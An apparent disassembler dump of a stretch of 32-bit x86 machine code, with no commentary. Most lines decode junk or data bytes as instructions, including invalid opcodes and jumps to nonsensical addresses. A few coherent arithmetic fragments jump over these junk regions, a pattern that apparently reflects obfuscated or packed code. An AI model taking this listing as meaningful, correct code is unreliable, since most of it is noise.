  40c718:	push   0xb03914d5
  40c71d:	cmp    DWORD PTR [eax*4+0x17bc827],ecx
  40c724:	sbb    eax,0x25affc6e
  40c729:	mov    bl,bl
  40c72b:	arpl   WORD PTR [ebx+edx*1+0x40],bp
  40c72f:	jo     0x40c78f
  40c731:	inc    edx
  40c732:	sbb    al,0x7c
  40c734:	icebp  
  40c735:	fwait
  40c736:	daa    
  40c737:	adc    edx,esp
  40c739:	jmp    0x40c6df
  40c73b:	cmp    eax,0xd188817c
  40c740:	enter  0x748c,0xe2
  40c744:	movlhps xmm6,xmm0
  40c747:	mov    ebx,DWORD PTR ds:0x1131eb96
  40c74d:	xchg   ebx,eax
  40c74e:	js     0x40c735
  40c750:	rcl    esp,1
  40c752:	inc    BYTE PTR [edi+0x7a]
  40c755:	(bad)  
  40c756:	call   0x7ab7e0b1
  40c75b:	arpl   bp,di
  40c75d:	sbb    edi,0x18
  40c760:	pusha  
  40c761:	fwait
  40c762:	xchg   esi,eax
  40c763:	inc    eax
  40c764:	xor    cl,BYTE PTR [eax+0x34]
  40c767:	adc    eax,0x518fd1f7
  40c76c:	das    
  40c76d:	shl    DWORD PTR [edx+0x7c],1
  40c770:	ins    BYTE PTR es:[edi],dx
  40c771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c772:	jae    0x40c7a2
  40c774:	sbb    al,0xe8
  40c776:	cmp    al,0x6f
  40c778:	cmp    esi,esi
  40c77a:	cmp    BYTE PTR [ebp+0xb8c01cb],bh
  40c780:	popf   
  40c781:	pop    ebp
  40c782:	bound  edi,QWORD PTR [eax+0x643dc2e7]
  40c788:	in     eax,0x3e
  40c78a:	or     edx,DWORD PTR ds:0x9d66b6b6
  40c790:	push   esp
  40c791:	push   edx
  40c792:	and    BYTE PTR [esi-0x1284be32],0x50
  40c799:	push   edi
  40c79a:	xlat   BYTE PTR ds:[ebx]
  40c79b:	fs pop ebx
  40c79d:	push   ecx
  40c79e:	xor    al,bl
  40c7a0:	cmp    BYTE PTR [eax-0x6c],bh
  40c7a3:	mov    ah,0xe4
  40c7a5:	pushf  
  40c7a6:	imul   di,WORD PTR [edx+0x2a],0xff85
  40c7ab:	adc    al,0x21
  40c7ad:	(bad)  
  40c7ae:	dec    esi
  40c7af:	mov    eax,0xcd9625b9
  40c7b4:	jne    0x40c7dd
  40c7b6:	sbb    cl,dl
  40c7b8:	xchg   ebx,eax
  40c7b9:	cmp    esi,DWORD PTR [edx-0x1a]
  40c7bc:	lahf   
  40c7bd:	fidivr WORD PTR [ecx+0x2abab135]
  40c7c3:	inc    edx
  40c7c4:	jbe    0x40c82d
  40c7c6:	pop    ebp
  40c7c7:	(bad)  
  40c7c8:	jg     0x40c80d
  40c7ca:	pop    edx
  40c7cb:	and    BYTE PTR [ecx+0x7e404529],al
  40c7d1:	cdq    
  40c7d2:	jo     0x40c7e6
  40c7d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7d5:	cli    
  40c7d6:	std    
  40c7d7:	push   eax
  40c7d8:	or     eax,0x102ec375
  40c7dd:	test   DWORD PTR [ecx-0x7b],ebp
  40c7e0:	fcmove st,st(5)
  40c7e2:	jb     0x40c7f4
  40c7e4:	loopne 0x40c85c
  40c7e6:	mov    cl,0x54
  40c7e8:	push   ds
  40c7e9:	cs sub al,0xc7
  40c7ec:	lea    edi,ds:0x3433b98d
  40c7f2:	and    al,0x6b
  40c7f4:	out    dx,eax
  40c7f5:	xchg   ecx,eax
  40c7f6:	add    bh,dl
  40c7f8:	add    dh,ah
  40c7fa:	shr    al,0x78
  40c7fd:	clc    
  40c7fe:	sub    eax,0x80eebddc
  40c803:	into   
  40c804:	test   al,0xd2
  40c806:	xor    BYTE PTR [edx],0xe9
  40c809:	lods   al,BYTE PTR ds:[esi]
  40c80a:	add    bh,BYTE PTR [esi-0x1c]
  40c80d:	push   ss
  40c80e:	xchg   edx,eax
  40c80f:	mov    WORD PTR [esi],gs
  40c811:	addr16 loope 0x40c7cb
  40c814:	in     eax,dx
  40c815:	xor    eax,0x801f39af
  40c81a:	jge    0x40c837
  40c81c:	xchg   edi,eax
  40c81d:	or     esp,DWORD PTR ds:0x5e42f740
  40c823:	inc    ebx
  40c824:	xor    dh,dl
  40c826:	enter  0x448b,0xf5
  40c82a:	int    0x9
  40c82c:	jl     0x40c7cf
  40c82e:	cmp    DWORD PTR [ebp+0x57],ebx
  40c831:	pop    edx
  40c832:	retf   
  40c833:	test   edx,esi
  40c835:	cwde   
  40c836:	push   ebx
  40c837:	push   eax
  40c838:	mul    BYTE PTR [ebx]
  40c83a:	pop    ebp
  40c83b:	pushf  
  40c83c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c83d:	stc    
  40c83e:	repz pusha 
  40c840:	push   ecx
  40c841:	inc    esi
  40c842:	xor    eax,0xc9fa5b41
  40c847:	addr16 mov al,ds:0x83c2
  40c84b:	aam    0xe9
  40c84d:	fdivr  QWORD PTR [eax+0x58]
  40c850:	fnsave [edi+0xb]
  40c853:	xor    DWORD PTR [edi],esp
  40c855:	mov    eax,ds:0x61b9e825
  40c85a:	jnp    0x40c8ac
  40c85c:	or     eax,0x9eb6f53b
  40c861:	out    0x46,eax
  40c863:	jge    0x40c8c4
  40c865:	mov    ebp,edi
  40c867:	pop    esi
  40c868:	es mov edi,0xca646330
  40c86e:	std    
  40c86f:	mov    ecx,ds
  40c871:	jl     0x40c856
  40c873:	addr16 addr16 jae 0x40c897
  40c877:	xchg   ebx,eax
  40c878:	addr16 out dx,eax
  40c87a:	lock push edi
  40c87c:	sahf   
  40c87d:	outs   dx,BYTE PTR ds:[esi]
  40c87e:	fisubr DWORD PTR [esi+0x4fee6dc6]
  40c884:	scas   al,BYTE PTR es:[edi]
  40c885:	xchg   DWORD PTR [ecx+0x48],ebp
  40c888:	xchg   ebx,eax
  40c889:	jns    0x40c8d2
  40c88b:	dec    esp
  40c88c:	push   0xfffffff9
  40c88e:	sbb    DWORD PTR [esi-0x1ffd34ff],edx
  40c894:	push   esp
  40c895:	jecxz  0x40c8d3
  40c897:	xchg   edx,eax
  40c898:	sbb    al,0x2a
  40c89a:	lods   al,BYTE PTR ds:[esi]
  40c89b:	ret    
  40c89c:	into   
  40c89d:	xchg   ecx,eax
  40c89e:	xor    BYTE PTR ds:[edx+0x58],ch
  40c8a2:	xor    DWORD PTR [eax+0x72],0xffffffd4
  40c8a6:	fs adc al,0x99
  40c8a9:	xchg   BYTE PTR [esi],ch
  40c8ab:	mov    esp,0x56dd268b
  40c8b0:	xor    DWORD PTR [edx],edi
  40c8b2:	xchg   BYTE PTR [eax+0x7055b5c0],ch
  40c8b8:	jl     0x40c8e1
  40c8ba:	and    BYTE PTR [ecx+0x3d792659],0xaf
  40c8c1:	or     BYTE PTR ds:0x5e494148,0x74
  40c8c8:	out    0x8c,al
  40c8ca:	or     eax,0xe1bc6fc1
  40c8cf:	add    DWORD PTR [eax+0x1d1f0a99],edx
  40c8d5:	out    0x6b,al
  40c8d7:	xchg   BYTE PTR [ecx-0x5b],ch
  40c8da:	sbb    DWORD PTR [eax+0x65ce465e],ebx
  40c8e0:	xchg   BYTE PTR [ebx],al
  40c8e2:	aas    
  40c8e3:	xor    esp,eax
  40c8e5:	add    ah,BYTE PTR [ecx]
  40c8e7:	jg     0x40c8d9
  40c8e9:	cmp    ecx,DWORD PTR [esi+edx*1-0x178274ad]
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	int3   
  40c919:	push   es
  40c91a:	outs   dx,BYTE PTR ds:[esi]
  40c91b:	test   ah,ch
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c9a2
  40c925:	frstor [eax]
  40c927:	fimul  DWORD PTR [edi]
  40c929:	xor    eax,0xe5fdeaa2
  40c92e:	push   0xafe214ab
  40c933:	ret    
  40c934:	pop    eax
  40c935:	pusha  
  40c936:	pop    ebx
  40c937:	dec    esp
  40c938:	ret    
  40c939:	and    eax,0x731ee531
  40c93e:	aad    0xc8
  40c940:	and    BYTE PTR [esi+0x45],dh
  40c943:	xchg   dh,al
  40c945:	call   0x96e861b6
  40c94a:	les    esp,FWORD PTR [ecx+edx*1-0x7e154338]
  40c951:	loope  0x40c92b
  40c953:	ja     0x40c918
  40c955:	aaa    
  40c956:	arpl   sp,cx
  40c958:	jmp    0x5e67:0x17ffefb2
  40c95f:	jp     0x40c990
  40c961:	xchg   esi,eax
  40c962:	(bad)  
  40c963:	(bad)  
  40c965:	dec    esp
  40c966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c967:	mov    bh,0x96
  40c969:	rol    BYTE PTR [edi+0x7b],1
  40c96c:	mov    edi,0x242abb8f
  40c971:	(bad)  
  40c972:	stc    
  40c973:	cmp    dh,0x16
  40c976:	add    BYTE PTR [edi+0x2804e798],ah
  40c97c:	jmp    DWORD PTR [ebx+eiz*4-0x34]
  40c980:	mov    edi,0x12a6bbf9
  40c985:	pop    edi
  40c986:	inc    esp
  40c987:	ja     0x40c940
  40c989:	pusha  
  40c98a:	daa    
  40c98b:	dec    esp
  40c98c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c98d:	(bad)  
  40c98e:	xor    esi,eax
  40c990:	cmp    al,0x6d
  40c992:	adc    BYTE PTR [edi],ah
  40c994:	daa    
  40c995:	cmp    eax,0x99ac1015
  40c99a:	fstp   TBYTE PTR [edi-0x8]
  40c99d:	imul   edx,DWORD PTR [ebp+0x626bfea1],0xffffffec
  40c9a4:	jge    0x40ca00
  40c9a6:	xor    al,0xb6
  40c9a8:	cwde   
  40c9a9:	js     0x40c9b8
  40c9ab:	in     eax,0x1b
  40c9ad:	sbb    DWORD PTR [edx],esp
  40c9af:	fdivr  QWORD PTR [edx+eiz*4-0x53]
  40c9b3:	pop    ecx
  40c9b4:	lea    ebx,[ebp+edi*8-0x173d0589]
  40c9bb:	xchg   BYTE PTR ds:0xcde47e8d,al
  40c9c1:	and    ecx,eax
  40c9c3:	int    0xb4
  40c9c5:	add    ebp,DWORD PTR [ecx]
  40c9c7:	jle    0x40ca0e
  40c9c9:	cwde   
  40c9ca:	push   0x58
  40c9cc:	out    0xb1,eax
  40c9ce:	ret    0x89a6
  40c9d1:	jg     0x40c97f
  40c9d3:	mov    ds:0x7f54a498,al
  40c9d8:	inc    ebx
  40c9d9:	adc    BYTE PTR [edx],al
  40c9db:	push   DWORD PTR [edx+0x5e51e81c]
  40c9e1:	xor    al,0xa1
  40c9e3:	aas    
  40c9e4:	aaa    
  40c9e5:	jl     0x40c974
  40c9e7:	xor    eax,0x6e407378
  40c9ec:	(bad)  
  40c9ed:	xor    eax,0xa099d543
  40c9f2:	rcl    ebx,0xf2
  40c9f5:	aam    0x4d
  40c9f7:	out    0x56,eax
  40c9f9:	out    0x1f,al
  40c9fb:	inc    ecx
  40c9fc:	out    dx,eax
  40c9fd:	inc    edi
  40c9fe:	mov    ch,dl
  40ca00:	jb     0x40ca3f
  40ca02:	and    eax,0x3d76d04e
  40ca07:	call   0x72a4:0xa46fb8c5
  40ca0e:	stc    
  40ca0f:	xchg   BYTE PTR [edi+esi*1-0x200a92cd],ch
  40ca16:	pop    ss
  40ca17:	imul   ebp,DWORD PTR [ebp+0x75],0x30c626b9
  40ca1e:	outs   dx,BYTE PTR ds:[esi]
  40ca1f:	mov    edx,0x58c187ce
  40ca24:	sub    BYTE PTR [esi+eax*8-0x3218fa6a],dl
  40ca2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca2c:	retf   0xf1b8
  40ca2f:	jge    0x40c9ca
  40ca31:	jp     0x40ca3c
  40ca33:	std    
  40ca34:	mov    bh,0x2b
  40ca36:	cmp    DWORD PTR [ebp+ebp*1-0x33],eax
  40ca3a:	lea    ecx,[esi]
  40ca3c:	pop    ss
  40ca3d:	push   ebx
  40ca3e:	out    dx,eax
  40ca3f:	loop   0x40ca41
  40ca41:	cmp    ch,BYTE PTR [ebx-0x688da74c]
  40ca47:	ret    
  40ca48:	in     al,0x97
  40ca4a:	pop    eax
  40ca4b:	mov    esp,0x6e9b2879
  40ca50:	mov    bh,0xb9
  40ca52:	add    BYTE PTR [ecx+0x45],dh
  40ca55:	popf   
  40ca56:	xchg   ecx,eax
  40ca57:	lods   eax,DWORD PTR ds:[esi]
  40ca58:	ss ins DWORD PTR es:[edi],dx
  40ca5a:	(bad)  
  40ca5b:	mov    bh,0x70
  40ca5d:	stos   DWORD PTR es:[edi],eax
  40ca5e:	and    eax,0xf2e980b1
  40ca63:	mov    ds:0x12134f3b,al
  40ca68:	dec    edi
  40ca69:	xchg   BYTE PTR [ecx+esi*1],bh
  40ca6c:	pusha  
  40ca6d:	sti    
  40ca6e:	or     eax,0xa926cc31
  40ca73:	loopne 0x40cae4
  40ca75:	jne    0x40caa4
  40ca77:	dec    ebx
  40ca78:	xchg   BYTE PTR [edx],ah
  40ca7a:	sar    ebx,0xf6
  40ca7d:	mov    ebp,DWORD PTR [eax-0x22]
  40ca80:	inc    esi
  40ca81:	retf   0x98f0
  40ca84:	mov    al,ds:0xfb9c730f
  40ca89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca8a:	stos   BYTE PTR es:[edi],al
  40ca8b:	je     0x40ca94
  40ca8d:	sbb    edi,DWORD PTR [ebx+0x370f7e3d]
  40ca93:	loope  0x40ca90
  40ca95:	sub    cl,BYTE PTR [edi-0x32e796f9]
  40ca9b:	sar    BYTE PTR [ebx-0x56878ec8],1
  40caa1:	int3   
  40caa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caa3:	jp     0x40caf0
  40caa5:	xchg   ecx,eax
  40caa6:	ja     0x40caf6
  40caa8:	jecxz  0x40ca83
  40caaa:	jb     0x40ca73
  40caac:	or     DWORD PTR [eax+ebp*2-0x5d2ea1f5],eax
  40cab3:	pop    esi
  40cab4:	mov    edx,0x25efc06f
  40cab9:	lods   eax,DWORD PTR ds:[esi]
  40caba:	xor    al,ch
  40cabc:	pushf  
  40cabd:	rcr    DWORD PTR [ebx+0x423a80d4],1
  40cac3:	push   ebx
  40cac4:	jge    0x40cae0
  40cac6:	xchg   ebp,eax
  40cac7:	xchg   BYTE PTR [esi-0x7],ch
  40caca:	test   eax,0x45512951
  40cacf:	sbb    eax,0xaf61d9dd
  40cad4:	mov    ebx,0xe1d8d155
  40cad9:	adc    BYTE PTR [eax],ch
  40cadb:	int3   
  40cadc:	and    edi,DWORD PTR [ecx]
  40cade:	push   eax
  40cadf:	jo     0x40ca96
  40cae1:	xchg   DWORD PTR [eax+ecx*4],esi
  40cae4:	rcr    DWORD PTR [ecx-0x67],0x60
  40cae8:	stos   BYTE PTR es:[edi],al
  40cae9:	aaa    
  40caea:	(bad)  
  40caeb:	js     0x40caf2
  40caed:	sbb    edi,DWORD PTR [esi]
  40caef:	or     eax,0x9efa0cc4
  40caf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40caf5:	mov    cl,0xc
  40caf7:	pop    DWORD PTR [edi+edx*2-0x103200df]
  40cafe:	stc    
  40caff:	out    0x19,al
  40cb01:	push   ecx
  40cb02:	dec    ecx
  40cb03:	and    cl,bl
  40cb05:	neg    DWORD PTR [ebx]
  40cb07:	ds loop 0x40cb83
  40cb0a:	lea    ecx,[ebx]
  40cb0c:	or     eax,eax
  40cb0e:	mov    dl,0x7d
  40cb10:	mov    ds:0x29b6791a,al
  40cb15:	lea    edx,[eax+0x4b862a25]
  40cb1b:	jns    0x40cb29
  40cb1d:	adc    dl,ah
  40cb1f:	pop    eax
  40cb20:	lock or eax,0x496b65bd
  40cb26:	dec    ebx
  40cb27:	addr16 inc ebx
  40cb29:	pop    esi
  40cb2a:	dec    ebx
  40cb2b:	xchg   BYTE PTR [edi+0x40094940],dh
  40cb31:	test   BYTE PTR [ecx+0x52],0xfa
  40cb35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb36:	call   0xd4f9fe2d
  40cb3b:	loopne 0x40cbb4
  40cb3d:	xlat   BYTE PTR ds:[ebx]
  40cb3e:	mov    ah,0x17
  40cb40:	cdq    
  40cb41:	fs push edi
  40cb43:	push   ebp
  40cb44:	cmp    BYTE PTR [ecx],0xbe
  40cb47:	loopne 0x40cada
  40cb49:	(bad)  
  40cb4a:	jmp    0x40caf4
  40cb4c:	test   al,0xf0
  40cb4e:	inc    edx
  40cb4f:	mov    esp,0x17b678ca
  40cb54:	lods   al,BYTE PTR ds:[esi]
  40cb55:	cmp    ebx,DWORD PTR [edi]
  40cb57:	xchg   esp,eax
  40cb58:	cmp    edi,ecx
  40cb5a:	push   es
  40cb5b:	jl     0x40cba9
  40cb5d:	pushf  
  40cb5e:	scas   eax,DWORD PTR es:[edi]
  40cb5f:	daa    
  40cb60:	test   DWORD PTR [eax+0x45c9300b],0x39b7e5fc
  40cb6a:	and    esp,DWORD PTR [ebx+0x6fa42059]
  40cb70:	jmp    0x40cb8e
  40cb72:	mov    ebp,0x8c17da39
  40cb77:	aam    0x8a
  40cb79:	add    eax,0xe28b159d
  40cb7e:	inc    eax
  40cb7f:	add    DWORD PTR [ebp-0x32ab5f33],edi
  40cb85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb86:	and    BYTE PTR [eax],dl
  40cb88:	or     BYTE PTR [ebx-0x57a625fb],0x9d
  40cb8f:	out    dx,ax
  40cb91:	cld    
  40cb92:	adc    eax,0xa6f2568a
  40cb97:	cli    
  40cb98:	rcl    edi,1
  40cb9a:	(bad)  
  40cb9b:	repnz mov bh,0x64
  40cb9e:	mov    fs,WORD PTR [ecx+0x133561c8]
  40cba4:	adc    DWORD PTR [esi-0x3f0c237d],esi
  40cbaa:	jmp    0x40cc1a
  40cbac:	sub    eax,0xc616cb43
  40cbb2:	mov    WORD PTR [eax],?
  40cbb4:	dec    edx
  40cbb5:	ins    DWORD PTR es:[edi],dx
  40cbb6:	mov    al,0x59
  40cbb8:	in     al,0xfb
  40cbba:	loope  0x40cbdb
  40cbbc:	mov    ebp,DWORD PTR [edx]
  40cbbe:	fldcw  WORD PTR [ecx+0x1e143770]
  40cbc4:	mov    bl,0xc9
  40cbc6:	push   es
  40cbc7:	pop    edx
  40cbc8:	add    DWORD PTR [edi+0x64bb6933],ebp
  40cbce:	test   cl,0xd1
  40cbd1:	push   eax
  40cbd2:	scas   al,BYTE PTR es:[edi]
  40cbd3:	aaa    
  40cbd4:	xor    eax,0x40b392ef
  40cbd9:	mov    dh,0x9a
  40cbdb:	cmp    DWORD PTR [ecx],0x2f
  40cbde:	dec    ebp
  40cbdf:	inc    ecx
  40cbe0:	jmp    0x40cbab
  40cbe2:	mov    bl,0x63
  40cbe4:	stc    
  40cbe5:	call   FWORD PTR [ebp+0x38b5bd4c]
  40cbeb:	stos   DWORD PTR es:[edi],eax
  40cbec:	cmp    eax,0x1043a61
  40cbf1:	mul    ebp
  40cbf3:	mov    edi,0x9be89758
  40cbf8:	dec    edi
  40cbf9:	stos   DWORD PTR es:[edi],eax
  40cbfa:	mov    cl,0x22
  40cbfc:	mov    ecx,0x67666ef
  40cc01:	push   esi
  40cc02:	cmp    DWORD PTR [esi-0x4c2b98d3],ecx
  40cc08:	lahf   
  40cc09:	out    dx,al
  40cc0a:	mov    ecx,0x2e9a4bf
  40cc0f:	in     eax,0x6f
  40cc11:	icebp  
  40cc12:	push   ebx
  40cc13:	mov    eax,0x8b9b5286
  40cc18:	out    dx,eax
  40cc19:	adc    dl,BYTE PTR [edi-0x17]
  40cc1c:	push   ss
  40cc1d:	pushf  
  40cc1e:	mov    edi,0xe8fad0fa
  40cc23:	test   BYTE PTR [ecx-0x20f8d11c],cl
  40cc29:	retf   0x9ebb
  40cc2c:	ds js  0x40cbb0
  40cc2f:	mov    ah,0x2a
  40cc31:	dec    edi
  40cc32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc33:	xchg   edx,eax
  40cc34:	jns    0x40cc2c
  40cc36:	arpl   si,dx
  40cc38:	add    DWORD PTR [eax],edx
  40cc3a:	cmp    esp,DWORD PTR [edi]
  40cc3c:	xchg   esp,eax
  40cc3d:	pusha  
  40cc3e:	(bad)  
  40cc3f:	mov    WORD PTR [edx],?
  40cc41:	jmp    0xfd0f:0x526d6753
  40cc48:	mov    al,0x85
  40cc4a:	sbb    BYTE PTR [edx],bl
  40cc4c:	adc    BYTE PTR [edx-0x76145161],0x19
  40cc53:	dec    edx
  40cc54:	shr    edx,cl
  40cc56:	or     DWORD PTR [ebx+eax*4],0xf912c1c
  40cc5d:	in     al,dx
  40cc5e:	imul   esp,esp,0xffffffef
  40cc61:	sub    al,dh
  40cc63:	xchg   edx,eax
  40cc64:	fs mov cl,0x36
  40cc67:	shl    DWORD PTR ds:0x99dc6669,0x2f
  40cc6e:	sub    DWORD PTR [ecx],esi
  40cc70:	les    eax,FWORD PTR [esi+0x341c19a1]
  40cc76:	mov    al,ds:0x55819de3
  40cc7b:	sbb    ah,ah
  40cc7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc7e:	or     al,0xd9
  40cc80:	shl    DWORD PTR [edx+0x17],cl
  40cc83:	dec    ebp
  40cc84:	jmp    0x9c9decac
  40cc89:	jb     0x40ccb6
  40cc8b:	xchg   ebx,eax
  40cc8c:	out    0x9a,al
  40cc8e:	and    edi,DWORD PTR [ecx-0x66]
  40cc91:	sub    ebx,DWORD PTR [ebx+0x2a]
  40cc94:	inc    ecx
  40cc95:	je     0x40ccf5
  40cc97:	cli    
  40cc98:	or     edx,DWORD PTR [ecx]
  40cc9a:	jmp    0x9ab853ac
  40cc9f:	xchg   esp,eax
  40cca0:	add    eax,edx
  40cca2:	push   esi
  40cca3:	xchg   al,cl
  40cca5:	std    
  40cca6:	jno    0x40cc9a
  40cca8:	loopne 0x40cce0
  40ccaa:	push   esi
  40ccab:	sub    bl,BYTE PTR [edi-0x3051d992]
  40ccb1:	dec    edi
  40ccb2:	mov    bl,0x7a
  40ccb4:	jmp    0x8ca3:0x64b27ee0
  40ccbb:	sbb    BYTE PTR [edi],bl
  40ccbd:	arpl   WORD PTR [edx],cx
  40ccbf:	ins    BYTE PTR es:[edi],dx
  40ccc0:	bound  ecx,QWORD PTR [esi]
  40ccc2:	daa    
  40ccc3:	je     0x40cd3f
  40ccc5:	xor    edi,eax
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	sbb    DWORD PTR [ebx+edx*1+0x6b],0xffffffed
  40cd1a:	or     edx,DWORD PTR [eax+0x7d9f7070]
  40cd20:	jo     0x40cd92
  40cd22:	push   es
  40cd23:	sbb    edi,DWORD PTR [edx]
  40cd25:	shl    DWORD PTR [esi+ebp*8-0x63264b4d],cl
  40cd2c:	xor    eax,0xa6569045
  40cd31:	icebp  
  40cd32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd33:	adc    BYTE PTR [esi+0x6de5b063],0xf9
  40cd3a:	sahf   
  40cd3b:	mov    ebx,0x93f9c2bc
  40cd40:	arpl   WORD PTR [ebx],di
  40cd42:	enter  0x164f,0xb3
  40cd46:	dec    ebp
  40cd47:	imul   edx,DWORD PTR [ecx-0x5f],0xb0f09060
  40cd4e:	mov    eax,ds:0x51e02041
  40cd53:	adc    eax,esp
  40cd55:	xchg   ebx,eax
  40cd56:	daa    
  40cd57:	int    0xd
  40cd59:	(bad)
  40cd5c:	ins    BYTE PTR es:[edi],dx
  40cd5d:	and    al,0xd6
  40cd5f:	loop   0x40ccf7
  40cd61:	sub    al,0xc5
  40cd63:	adc    al,0x91
  40cd65:	retf   0xdd2b
  40cd68:	mov    dl,0x2b
  40cd6a:	adc    bh,0x3e
  40cd6d:	sbb    BYTE PTR [edi],ch
  40cd6f:	test   al,0xac
  40cd71:	mov    al,ds:0xcae0f638
  40cd76:	jl     0x40cd54
  40cd78:	cwde   
  40cd79:	enter  0x3474,0xee
  40cd7d:	(bad)  
  40cd7e:	mov    bl,0x7c
  40cd80:	dec    esp
  40cd81:	add    ebp,ecx
  40cd83:	fld    TBYTE PTR [ebx]
  40cd85:	jae    0x40cdf5
  40cd87:	jmp    0x9fee21d4
  40cd8c:	or     DWORD PTR [esi+ecx*2],edi
  40cd8f:	(bad)  
  40cd90:	ficomp DWORD PTR [ebp+0x50745bc0]
  40cd96:	adc    BYTE PTR [edi+0x79],0xf9
  40cd9a:	xchg   edi,eax
  40cd9b:	icebp  
  40cd9c:	pop    ss
  40cd9d:	mov    WORD PTR [ecx+0x39],fs
  40cda0:	xor    al,0x40
  40cda2:	jb     0x40cd52
  40cda4:	inc    ebx
  40cda5:	dec    edx
  40cda6:	xor    al,BYTE PTR [edx]
  40cda8:	push   edi
  40cda9:	mov    ds:0x81652e2,eax
  40cdae:	mov    al,dh
  40cdb0:	rol    DWORD PTR [ebp-0x5787bbb0],cl
  40cdb6:	sub    BYTE PTR [edx-0x23251571],bh
  40cdbc:	mov    esi,0x3ef988c2
  40cdc1:	pop    esi
  40cdc2:	or     DWORD PTR [eax+esi*1+0x8],ebx
  40cdc6:	push   eax
  40cdc7:	mov    ecx,DWORD PTR [ebx+0x35]
  40cdca:	pop    ds
  40cdcb:	mov    ebx,DWORD PTR [eax-0x53]
  40cdce:	in     eax,0x56
  40cdd0:	push   ss
  40cdd1:	out    dx,al
  40cdd2:	add    DWORD PTR [eax+0x95efb39],ebx
  40cdd8:	xchg   esi,eax
  40cdd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdda:	jge    0x40cd84
  40cddc:	pushf  
  40cddd:	aam    0xf8
  40cddf:	xchg   ecx,eax
  40cde0:	enter  0x90e,0x2d
  40cde4:	sbb    esp,DWORD PTR [esi+ebx*4+0x42]
  40cde8:	push   es
  40cde9:	mov    esi,0x8f8867f1
  40cdee:	and    al,0x2e
  40cdf0:	addr16 adc esp,ebp
  40cdf3:	jne    0x40cdb0
  40cdf5:	jg     0x40cdad
  40cdf7:	lods   eax,DWORD PTR ds:[esi]
  40cdf8:	or     DWORD PTR [ebp-0x63745be7],0x11db0590
  40ce02:	mov    bh,0xcd
  40ce04:	popa   
  40ce05:	and    al,BYTE PTR [edi-0x752572e4]
  40ce0b:	(bad)  
  40ce0c:	pop    ebx
  40ce0d:	repnz inc ecx
  40ce0f:	cmp    ah,dh
  40ce11:	lock repz pop esi
  40ce14:	fistp  DWORD PTR [eax-0x5d]
  40ce17:	sar    BYTE PTR [edi-0x4ef992ce],cl
  40ce1d:	inc    eax
  40ce1e:	or     ebx,DWORD PTR [edi+0x70]
  40ce21:	stc    
  40ce22:	imul   ecx,DWORD PTR [ecx+edi*1-0x7a],0xabfbcd0
  40ce2a:	mov    ebp,0xab46cba8
  40ce2f:	daa    
  40ce30:	(bad)  [edx]
  40ce32:	in     eax,0x98
  40ce34:	retf   
  40ce35:	hlt    
  40ce36:	sub    al,0xd6
  40ce38:	pushf  
  40ce39:	les    edi,FWORD PTR [eax-0x7421a8b2]
  40ce3f:	stos   BYTE PTR es:[edi],al
  40ce40:	in     eax,dx
  40ce41:	mov    DWORD PTR [eax+0x293f6bb5],ebp
  40ce47:	and    cl,dh
  40ce49:	mov    cl,0xe0
  40ce4b:	xchg   ebx,eax
  40ce4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce4d:	out    0xb0,al
  40ce4f:	(bad)  
  40ce50:	jns    0x40ce90
  40ce52:	or     al,0xaf
  40ce54:	out    0x5d,al
  40ce56:	add    DWORD PTR [ecx-0x7d],ebx
  40ce59:	dec    ebp
  40ce5a:	push   ebx
  40ce5b:	inc    edi
  40ce5c:	and    dh,BYTE PTR [ebx]
  40ce5e:	jecxz  0x40ce0b
  40ce60:	dec    edi
  40ce61:	inc    eax
  40ce62:	push   edx
  40ce63:	xor    BYTE PTR [esi-0x18c6b945],cl
